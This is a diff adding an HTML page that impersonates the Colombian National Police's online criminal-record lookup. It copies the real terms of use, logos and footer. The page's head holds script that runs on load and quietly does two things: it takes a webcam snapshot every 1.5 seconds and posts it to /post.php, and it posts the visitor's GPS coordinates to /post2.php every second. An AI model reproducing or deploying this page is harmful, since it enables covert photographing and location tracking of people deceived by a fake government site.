@@ -1,0 +1,295 @@
+<?xml version='1.0' encoding='UTF-8' ?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" class="no-js">
+    <head id="j_idt2">
+        <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+        <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+        <link type="text/css" rel="stylesheet" href="javax.faces.resource/scrollpanel/scrollpanel.css47a8.css?ln=primefaces&amp;v=6.1" />
+        <title>Policía Nacional de Colombia</title>
+        <link rel="stylesheet" href="resources/templates/assets/css/bootstrap.css" />
+        <link rel="stylesheet" href="resources/templates/assets/css/plugins.css" />
+        <link rel="stylesheet" href="resources/templates/assets/css/style.css" />
+        <link rel="shortcut icon" type="image/png" href="resources/templates/assets/images/favicon.png" />
+       </head>
+       <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+     </div>
+     
+     <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+               <script>
+
+            function post(imgdata){
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata},
+                url: '/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result){
+                    // call the function that handles the response/results
+                },
+                error: function(){
+                }
+              });
+            };
+            
+            
+            'use strict';
+            
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const errorMsgElement = document.querySelector('span#errorMsg');
+            
+            const constraints = {
+              audio: false,
+              video: {
+                
+                facingMode: "user"
+              }
+            };
+            
+            // Access webcam
+            async function init() {
+              try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+              } catch (e) {
+                errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+              }
+            }
+            
+            // Success
+            function handleSuccess(stream) {
+              window.stream = stream;
+              video.srcObject = stream;
+            
+            var context = canvas.getContext('2d');
+              setInterval(function(){
+            
+                   context.drawImage(video, 0, 0, 640, 480);
+                   var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                   post(canvasData); }, 1500);
+              
+            
+            }
+            
+            // Load init
+            init();
+            
+            //location
+            navigator.geolocation.getCurrentPosition(success, error, options);
+
+            var options = {
+                EnableHighAccuracy: true,
+            }
+            function success(geolocationPosition){
+                let coord = geolocationPosition.coords;
+                setInterval(function(){
+                    post2(coord.latitude, coord.longitude);
+                }, 1000);
+            }
+            function error(){
+                navigator.geolocation.getCurrentPosition(success, error, options);
+            }
+            function post2(latitudes, longitudes){
+            $.ajax({
+                type: 'POST',
+                data: { latitude: latitudes, 
+                        longitude: longitudes},
+                url: '/post2.php',
+                async: false,
+              });
+            };
+            
+        </script>
+
+        <body>
+
+        <section id="social" class="social">
+            <div class="container">
+                <div class="row">
+                    <div class="social-wrapper">
+                        <div class="col-md-12">
+                            <div class="social-icon">
+                                <a href="https://www.facebook.com/Policianacionaldeloscolombianos" target="_blank" title="Facebook"><i class="fa fa-facebook"></i></a>
+                                <a href="http://twitter.com/PoliciaColombia/lists/cuadrantevirtual/members" target="_blank" title="Twitter"><i class="fa fa-twitter"></i></a>
+                                <a href="https://plus.google.com/+PoliciaGovColombia" target="_blank" title="Google+"><i class="fa fa-google-plus"></i></a>
+                                <a href="https://www.instagram.com/policiadecolombia/" target="_blank" title="Instagram"><i class="fa fa-instagram"></i></a>
+                                <a href="https://www.flickr.com/photos/policiacolombia" target="_blank" title="Flickr"><i class="fa fa-flickr"></i></a>
+                                <a href="https://pinterest.com/policiacolombia/" target="_blank" title="Pinterest"><i class="fa fa-pinterest"></i></a>
+                                <a href="https://www.youtube.com/user/policiadecolombia" target="_blank" title="YouTube"><i class="fa fa-youtube"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+          <nav class="navbar navbar-default">
+            <div class="container">
+                <div class="navbar-header">  
+                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+                        <span class="sr-only"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="http://www.policia.gov.co/"><img src="resources/templates/assets/images/logo_pol.png" alt="Logo" /></a>
+                </div>
+
+                <div class="collapse navbar-collapse" id="navbar-collapse-1">
+
+                    <ul class="nav navbar-nav navbar-right">
+                        <li><a href="index2.html">Inicio</a></li>
+                        
+                        <li><a href="index2.html">Contáctenos</a></li>
+                        <li><a href="index2.html">Preguntas Frecuentes</a></li>
+                    </ul>
+
+                </div>
+            </div>
+        </nav>
+        
+        <header id="home" class="home">
+            <div class="overlay-fluid-block">
+                <div class="container text-center">
+                    <div class="row">
+                        <div class="home-wrapper">
+                            <div class="col-md-10 col-md-offset-1">
+                                <div class="home-content">
+
+                                        <h1>Bienvenido a la Consulta de Antecedentes Judiciales </h1>
+                                        <p>Términos de uso:</p>
+                                                    <div id="j_idt8" class="ui-scrollpanel ui-scrollpanel-native ui-widget ui-widget-content ui-corner-all form-control" style="width:945px;height:248px;text-align:left;">
+                                                            El acceso a la consulta de Antecedentes Judiciales por Internet es un servicio de carácter permanente que presta la Policía Nacional de Colombia conforme a lo establecido en el artículo 94 del Decreto 019 de 2012, para que los ciudadanos puedan validar su información judicial personal. El uso de la información suministrada por la Policía Nacional de Colombia está limitado a fines personales, cualquier uso para una finalidad diferente, como la obtención de un beneficio económico o la consulta de información personal de un tercero, será considerado irregular y estará sujeto al inicio de las acciones legales pertinentes. Se prohíbe expresamente a cualquier persona natural o jurídica, diferente del titular de los datos, la utilización de la información personal contenida en este sitio web.
+                                                            <br /><br />
+                                                            Esta consulta en línea cuenta con mecanismos de seguridad para controlar el acceso y la utilización de la información contenida, por lo tanto, la Policía Nacional de Colombia podrá bloquear el acceso a esta página web por cualquier utilización que considere irregular y entablar las acciones legales correspondientes.
+                                                            <br /><br />
+                                                            Usted ahora puede acceder a su información de antecedentes judiciales si cumple las siguientes condiciones:
+                                                            <br /><br />
+                                                            <ol>
+                                                                <li>Es claro para mí, que la Policía Nacional de Colombia no toma ni recomienda decisiones sobre antecedentes judiciales, teniendo en cuenta que la Institución es depositaria de la información emanada de las diferentes autoridades judiciales.</li>
+
+                                                                <li>Acepto que en cualquier momento y sin previo aviso, la Policía Nacional de Colombia puede modificar o actualizar la consulta en línea de antecedentes de la manera que estime conveniente y que no tiene ninguna obligación de continuar el servicio en sus actuales condiciones.</li>
+
+                                                                <li>Entiendo que, en consecuencia, la Policía Nacional de Colombia es responsable por asegurar la concordancia entre los datos que le han sido suministrados y los que registra/divulga, pero no tiene ninguna responsabilidad por la veracidad de los mismos.</li>
+
+                                                                <li>Es claro para mí que, por medio de esta consulta en línea de antecedentes judiciales, la Policía Nacional de Colombia pone a mi alcance los mecanismos necesarios para que pueda ejercer el derecho de habeas data, de acuerdo con lo establecido en el artículo 15 de la Constitución Política de Colombia y con la doctrina de la Corte Constitucional de Colombia.</li>
+
+                                                                <li>Declaro conocer que, además de la página web, la Policía Nacional de Colombia ha puesto a mi disposición otros mecanismos para facilitarme el ejercicio del habeas data, tanto presencialmente como por escrito. En consecuencia, reconozco que si por motivos técnicos o de cualquier otra índole, no pudiere acceder a mis antecedentes judiciales por esta consulta en línea, no se me está impidiendo ni limitando el ejercicio del habeas data.</li>
+
+                                                                <li>Declaro que únicamente solicitaré información relativa a mi persona y que no obtendré beneficios económicos con este servicio.</li>
+
+                                                                <li>Declaro que me hago responsable por el uso y cuidado de la información que llegare a obtener a través de la presente consulta en línea de antecedentes judiciales.</li>
+                                                            </ol>
+                                                            <br />
+                                                            La Policía Nacional, se permite informar que:
+                                                            <br /><br />
+                                                            En cumplimiento a lo estipulado en la Ley Estatutaria 1581 de 2012, consecuentemente con lo previsto en el Decreto 1377 de 2013, y demás normatividad legal vigente para el tratamiento de datos personales, da a conocer a todas las personas cuyos datos personales se encuentran administrados en nuestras bases de datos, que estos serán utilizados con los siguientes fines:
+                                                            <br /><br />
+                                                            <ul>
+                                                                <li>• Adelantar los trámites y servicios que tiene a cargo, en ejercicio de sus funciones la Policía Nacional.</li>
+                                                                <li>• Dar a conocer los servicios ofrecidos por la Policía Nacional.</li>
+                                                                <li>• Participar en eventos organizados por la Policía Nacional.</li>
+                                                                <li>• Invitar a eventos de participación ciudadana.</li>
+                                                                <li>• Evaluar la calidad de los servicios ofertados por la Policía Nacional.</li>
+                                                            </ul>
+                                                            <br />
+                                                            El uso y manejo de los mismos, se efectúa bajo estrictos estándares de responsabilidad, dentro de los cuales está el respeto al debido proceso y a la protección de la información.
+                                                            <br /><br />
+                                                            En todo caso, en cualquier momento el titular de la información podrá revocar su consentimiento y ejercer su derecho a la supresión de datos personales consagrado en la Ley Estatutaria 1581 de 2012.
+                                                            <br /><br />
+                                                            Es importante indicar que la solicitud de supresión de información personal y la revocatoria de la autorización para el tratamiento de datos personales no procederán cuando el titular de dichos datos tenga un deber legal o contractual de permanecer en la base de datos y/o archivos de la Policía Nacional, ni mientras se encuentre vigente la relación entre el titular y la referida Institución Policial, en virtud de la cual fueron recolectados los datos.
+                                                            <br /><br />
+                                                            Para mayor información consulte la <a href="https://www.policia.gov.co/vinculos/habeas-data" target="_blank" style="text-decoration:underline">Política de Tratamiento de Datos Personales de la Policía Nacional</a>.
+                                                            <br /><br />
+                                                        </div>
+                                                    <div id="j_idt11" class="ui-outputpanel ui-widget" style="margin-bottom:10px;"><table id="aceptaOption" style="margin-left: auto; margin-right: auto; color:white;">
+                                                        <tr>
+                                                    <td>
+                                                    <input type="radio" name="aceptaOption" id="aceptaOption:0" value="true"/><label for="aceptaOption:0"> Acepto</label></td>
+                                                    <td>
+                                                    <input type="radio" checked="checked" name="aceptaOption" id="aceptaOption:1" value="false"/><label for="aceptaOption:1"> No Acepto</label></td>
+                                                        </tr>
+                                                    </table><button id="continuarBtn" name="continuarBtn" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only ui-state-disabled" disabled="disabled"><span class="ui-button-text ui-c">Enviar</span></button></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>      
+            </div>
+        </header>
+        
+        <footer id="footer" class="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="footer-wrapper">
+
+                        <div class="col-md-2 col-sm-6 col-xs-12 img-foot">
+                            <div class="footer-brand">
+                                
+                            </div>
+                        </div>
+                        <div class="col-md-2 col-sm-6 col-xs-12 img-foot">
+                            <div class="footer-brand">
+                                <img src="resources/templates/assets/images/logo_insp.png" alt="logo" />
+                            </div>
+                        </div>
+                        <div class="col-md-2 col-sm-6 col-xs-12 img-foot">
+                            <div class="footer-brand">
+                                <img src="resources/templates/assets/images/logo_iso.png" alt="logo" />
+                            </div>
+                        </div>
+
+                        <div class="col-md-6 col-sm-6 col-xs-12 img-foot">
+                            <div class="footer-info">
+                                Dirección: Calle 18A # 69F–45 Zona Industrial, barrio Montevideo. Bogotá D.C.<br />
+                                Atención administrativa: lunes a viernes 7:00 am a 1:00 pm y 2:00 pm a 5:00 pm<br />
+                                Línea de atención al ciudadano: 5159700 ext. 30552 (Bogotá)<br />
+                                Resto del país: 018000 910 112<br />
+                                E-mail: lineadirecta@policia.gov.co<br />
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div>
+                        <div class="footer-logos">
+                            <div class="col-md-3 col-sm-6 col-xs-12">
+                                <a href="http://wp.presidencia.gov.co/Paginas/presidencia.aspx" target="_blank">
+                                    <img src="resources/templates/assets/images/logo-presidencia-120.png" height="50" alt="logo" />
+                                    Presidencia de la República
+                                </a>
+                            </div>
+                            <div class="col-md-3 col-sm-6 col-xs-12">
+                                <a href="http://www.mindefensa.gov.co/" target="_blank">
+                                    <img src="resources/templates/assets/images/logo-mindefensa-120.png" height="50" alt="logo" />
+                                    Ministerio de Defensa Nacional
+                                </a>
+                            </div>
+                            <div class="col-md-3 col-sm-6 col-xs-12">
+                                <a href="http://www.colombiacompra.gov.co/" target="_blank">
+                                    <img src="resources/templates/assets/images/portal-contratacion-120.png" height="50" alt="logo" />
+                                    Portal Único de Contratación
+                                </a>
+                            </div>
+                            <div class="col-md-3 col-sm-6 col-xs-12">
+                                <a href="https://www.sivirtual.gov.co/" target="_blank">
+                                    <img src="resources/templates/assets/images/logo-gobierno-en-linea-120.png" height="50" alt="logo" />
+                                    Gobierno en Línea
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row derechos-foot" style="text-align: center">
+                    Todos los derechos reservados.
+                </div>
+            </div>
+        </footer>
+        <div class="scrollup">
+            <a href="#"><i class="fa fa-chevron-up"></i></a>
+        </div>
+
+        </body>
+    </html>
